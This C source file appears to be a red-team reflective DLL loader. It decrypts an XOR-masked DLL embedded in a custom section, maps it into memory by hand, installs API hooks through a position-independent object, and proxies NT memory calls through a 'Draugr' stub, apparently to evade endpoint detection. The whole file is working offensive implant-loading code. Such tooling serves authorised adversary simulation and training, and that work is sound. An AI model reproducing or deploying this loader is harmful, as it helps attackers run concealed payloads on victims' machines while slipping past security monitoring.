/*
 * Copyright 2025 Daniel Duggan, Zero-Point Security
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

void go(void * loaderArgument);

char * loaderStart() {
    return (char *)go;
}

#include "loader.h"
#include "tp.h"
#include "proxy.h"

#define WIN32_FUNC( x ) __typeof__( x ) * x

typedef struct {
    WIN32_FUNC(LoadLibraryA);
    WIN32_FUNC(GetProcAddress);
    DRAUGR Draugr;
    WIN32_FUNC(LoadLibraryW);
    WIN32_FUNC(LoadLibraryExW);
    WIN32_FUNC(VirtualAlloc);
    WIN32_FUNC(VirtualAllocEx);
    WIN32_FUNC(VirtualProtect);
    WIN32_FUNC(VirtualProtectEx);
    WIN32_FUNC(VirtualFree);
    WIN32_FUNC(VirtualQuery);
    WIN32_FUNC(GetThreadContext);
    WIN32_FUNC(SetThreadContext);
    WIN32_FUNC(ResumeThread);
    WIN32_FUNC(CreateThread);
    WIN32_FUNC(CreateRemoteThread);
    WIN32_FUNC(OpenProcess);
    WIN32_FUNC(OpenThread);
    WIN32_FUNC(ExitThread);
    WIN32_FUNC(CloseHandle);
    WIN32_FUNC(Sleep);
    WIN32_FUNC(CreateFileMappingA);
    WIN32_FUNC(MapViewOfFile);
    WIN32_FUNC(UnmapViewOfFile);
    WIN32_FUNC(DuplicateHandle);
    WIN32_FUNC(ReadProcessMemory);
    WIN32_FUNC(WriteProcessMemory);
    WIN32_FUNC(CreateProcessA);
} WIN32FUNCS;

char __DRAUGR__[0] __attribute__((section("draugr")));
char __HOOKS__[0]  __attribute__((section("hooks")));
char __DLL__[0]    __attribute__((section("dll")));
char __KEY__[0]    __attribute__((section("key")));

void * allocateVirtualMemory(SIZE_T size, ULONG protect)
{
    NTARGS args;
    memset(&args, 0, sizeof(NTARGS));

    void * baseAddress = NULL;

    args.functionPtr = (ULONG_PTR)(NTDLL$NtAllocateVirtualMemory);
    args.argument1   = (ULONG_PTR)(HANDLE)(-1);
    args.argument2   = (ULONG_PTR)(&baseAddress);
    args.argument3   = (ULONG_PTR)(0);
    args.argument4   = (ULONG_PTR)(&size);
    args.argument5   = (ULONG_PTR)(MEM_COMMIT|MEM_RESERVE);
    args.argument6   = (ULONG_PTR)(protect);

    ProxyNtApi(&args);

    return baseAddress;
}

void protectVirtualMemory(void * baseAddress, SIZE_T size, ULONG newProtect)
{
    NTARGS args;
    memset(&args, 0, sizeof(NTARGS));

    ULONG oldProtect = 0;

    args.functionPtr = (ULONG_PTR)(NTDLL$NtProtectVirtualMemory);
    args.argument1   = (ULONG_PTR)(HANDLE)(-1);
    args.argument2   = (ULONG_PTR)(&baseAddress);
    args.argument3   = (ULONG_PTR)(&size);
    args.argument4   = (ULONG_PTR)(newProtect);
    args.argument5   = (ULONG_PTR)(&oldProtect);

    ProxyNtApi(&args);
}

void freeVirtualMemory(void * baseAddress)
{
    NTARGS args;
    memset(&args, 0, sizeof(NTARGS));

    SIZE_T size = 0;

    args.functionPtr = (ULONG_PTR)(NTDLL$NtFreeVirtualMemory);
    args.argument1   = (ULONG_PTR)(HANDLE)(-1);
    args.argument2   = (ULONG_PTR)(&baseAddress);
    args.argument3   = (ULONG_PTR)(&size);
    args.argument4   = (ULONG_PTR)(MEM_RELEASE);

    ProxyNtApi(&args);
}

void fixSectionPermissions(DLLDATA * dll, char * src, char * dst, MEMORY_REGION * region)
{
    DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
    void                  * sectionDst       = NULL;
    DWORD                   sectionSize      = 0;
    DWORD                   newProtect       = 0;

    sectionHdr  = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

    for (int x = 0; x < numberOfSections; x++)
    {
        sectionDst  = dst + sectionHdr->VirtualAddress;
        sectionSize = sectionHdr->SizeOfRawData;

        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) {
            newProtect = PAGE_WRITECOPY;
        }
        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) {
            newProtect = PAGE_READONLY;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE)) {
            newProtect = PAGE_READWRITE;
        }
        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            newProtect = PAGE_EXECUTE;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
            newProtect = PAGE_EXECUTE_WRITECOPY;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
            newProtect = PAGE_EXECUTE_READ;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            newProtect = PAGE_EXECUTE_READWRITE;
        }

        /* set new permission */
        protectVirtualMemory(sectionDst, sectionSize, newProtect);

        /* track memory */
        region->sections[x].baseAddress     = sectionDst;
        region->sections[x].size            = sectionSize;
        region->sections[x].currentProtect  = newProtect;
        region->sections[x].previousProtect = newProtect;

        /* advance to our next section */
        sectionHdr++;
    }
}

void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout, void * loaderArgument)
{
    char     * hookSrc;
    PICO     * hookDst;
    RESOURCE * keyRes;
    RESOURCE * dllRes;
    DLLDATA    dllData;
    char     * dllSrc;
    char     * dllDst;

    /* Time to load the hook PICO */
    hookSrc = GETRESOURCE(__HOOKS__);

    /* Allocate memory for it */
    hookDst = (PICO *)allocateVirtualMemory(sizeof(PICO), PAGE_READWRITE);

    #if DEBUG
    dprintf("hookDst      : 0x%p\n", hookDst);
    dprintf("PicoDataSize : %d\n", PicoDataSize(hookSrc));
    dprintf("PicoCodeSize : %d\n", PicoCodeSize(hookSrc));
    #endif

    /* Load it into memory */
    PicoLoad((IMPORTFUNCS *)funcs, hookSrc, hookDst->code, hookDst->data);

    /* Make the code section RX */
    protectVirtualMemory(hookDst->code, PicoCodeSize(hookSrc), PAGE_EXECUTE_READ);

    /* Fill layout info */
    layout->hooks.baseAddress                 = (char *)hookDst;
    layout->hooks.size                        = sizeof(PICO);
    layout->hooks.sections[0].baseAddress     = hookDst->data;
    layout->hooks.sections[0].size            = PicoDataSize(hookSrc);
    layout->hooks.sections[0].currentProtect  = PAGE_READWRITE;
    layout->hooks.sections[0].previousProtect = PAGE_READWRITE;
    layout->hooks.sections[1].baseAddress     = hookDst->code;
    layout->hooks.sections[1].size            = PicoCodeSize(hookSrc);
    layout->hooks.sections[1].currentProtect  = PAGE_EXECUTE_READ;
    layout->hooks.sections[1].previousProtect = PAGE_EXECUTE_READ;

    /* Get PICO entry point */
    PICOHOOK_ENTRY picoEntry = (PICOHOOK_ENTRY)PicoEntryPoint(hookSrc, hookDst->code);

    /* Call it to install the hooks */
    picoEntry((IMPORTFUNCS *)funcs, layout);

    /* Get XOR key */
    keyRes = (RESOURCE *)GETRESOURCE(__KEY__);

    /* Get XOR'd DLL */
    dllRes = (RESOURCE *)GETRESOURCE(__DLL__);

    /* Unmask and copy it into memory */
    dllSrc = allocateVirtualMemory(dllRes->length, PAGE_READWRITE);

    for (int i = 0; i < dllRes->length; i++) {
        dllSrc[i] = dllRes->value[i] ^ keyRes->value[i % keyRes->length];
    }

    /* Parse the headers */
    ParseDLL(dllSrc, &dllData);

    /* Allocate memory for DLL */
    dllDst = allocateVirtualMemory(SizeOfDLL(&dllData), PAGE_READWRITE);

    /* Load it into memory */
    LoadDLL(&dllData, dllSrc, dllDst);
    ProcessImports((IMPORTFUNCS *)funcs, &dllData, dllDst);

    layout->dll.baseAddress = dllDst;
    layout->dll.size        = SizeOfDLL(&dllData);

    /* Fix section memory permissions */
    fixSectionPermissions(&dllData, dllSrc, dllDst, &layout->dll);

    /* Call hook entry point again to provide the updated memory layout */
    picoEntry((IMPORTFUNCS *)funcs, layout);

    /* Get its entry point */
    DLLMAIN_FUNC dllEntry = EntryPoint(&dllData, dllDst);

    /* Free the unmasked copy */
    freeVirtualMemory(dllSrc);

    /* Call it twice */
    dllEntry((HINSTANCE)dllDst, DLL_PROCESS_ATTACH, NULL);
    dllEntry((HINSTANCE)loaderStart(), 0x4, loaderArgument);
}

void go(void * loaderArgument)
{
    WIN32FUNCS      funcs;
    RESOURCE      * picSrc;
    char          * picDst;
    MEMORY_LAYOUT   layout;

    funcs.LoadLibraryA       = LoadLibraryA;
    funcs.GetProcAddress     = GetProcAddress;
    funcs.LoadLibraryW       = KERNEL32$LoadLibraryW;
    funcs.LoadLibraryExW     = KERNEL32$LoadLibraryExW;
    funcs.VirtualAlloc       = KERNEL32$VirtualAlloc;
    funcs.VirtualAllocEx     = KERNEL32$VirtualAllocEx;
    funcs.VirtualProtect     = KERNEL32$VirtualProtect;
    funcs.VirtualProtectEx   = KERNEL32$VirtualProtectEx;
    funcs.VirtualFree        = KERNEL32$VirtualFree;
    funcs.VirtualQuery       = KERNEL32$VirtualQuery;
    funcs.GetThreadContext   = KERNEL32$GetThreadContext;
    funcs.SetThreadContext   = KERNEL32$SetThreadContext;
    funcs.ResumeThread       = KERNEL32$ResumeThread;
    funcs.CreateThread       = KERNEL32$CreateThread;
    funcs.CreateRemoteThread = KERNEL32$CreateRemoteThread;
    funcs.OpenProcess        = KERNEL32$OpenProcess;
    funcs.OpenThread         = KERNEL32$OpenThread;
    funcs.ExitThread         = KERNEL32$ExitThread;
    funcs.CloseHandle        = KERNEL32$CloseHandle;
    funcs.Sleep              = KERNEL32$Sleep;
    funcs.CreateFileMappingA = KERNEL32$CreateFileMappingA;
    funcs.MapViewOfFile      = KERNEL32$MapViewOfFile;
    funcs.UnmapViewOfFile    = KERNEL32$UnmapViewOfFile;
    funcs.DuplicateHandle    = KERNEL32$DuplicateHandle;
    funcs.ReadProcessMemory  = KERNEL32$ReadProcessMemory;
    funcs.WriteProcessMemory = KERNEL32$WriteProcessMemory;
    funcs.CreateProcessA     = KERNEL32$CreateProcessA;

    /* Grab the Draugr PIC */
    picSrc = (RESOURCE *)GETRESOURCE(__DRAUGR__);

    /* Allocate memory for it */
    picDst = allocateVirtualMemory(picSrc->length, PAGE_READWRITE);

    #if DEBUG
    dprintf("picDst : 0x%p\n", picDst);
    #endif

    /* Copy it into memory */
    memcpy(picDst, picSrc->value, picSrc->length);

    /* Flip memory to RX */
    protectVirtualMemory(picDst, picSrc->length, PAGE_EXECUTE_READ);

    /* Set funcs field */
    funcs.Draugr = (DRAUGR)(picDst);

    /* Begin filling memory layout info */
    layout.pic.baseAddress    = picDst;
    layout.pic.size           = picSrc->length;

    /* Carry on loading the rest */
    reflectiveLoader(&funcs, &layout, loaderArgument);
}